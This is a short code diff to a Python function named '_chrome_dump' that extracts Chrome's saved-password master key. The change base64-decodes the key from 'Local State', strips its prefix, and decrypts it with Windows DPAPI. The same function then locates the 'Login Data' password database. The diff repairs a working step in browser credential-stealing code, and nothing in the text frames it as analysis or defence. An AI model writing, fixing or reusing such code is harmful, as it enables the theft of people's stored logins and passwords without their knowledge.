@@ -66,7 +66,9 @@ def _chrome_dump(user_data_path, name):
     try:
         with open(local_state, 'r', encoding='utf-8') as f:
             state = json.load(f)
-        key = win32crypt.CryptUnprotectData(state['os_crypt']['encrypted_key'], None, None, None, 0)[1]
+        import base64
+        raw_key = base64.b64decode(state['os_crypt']['encrypted_key'])[5:]
+        key = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
     except Exception:
         return f'[-] {name}: key extraction failed'
     login_db = os.path.join(user_data_path, 'Default', 'Login Data')
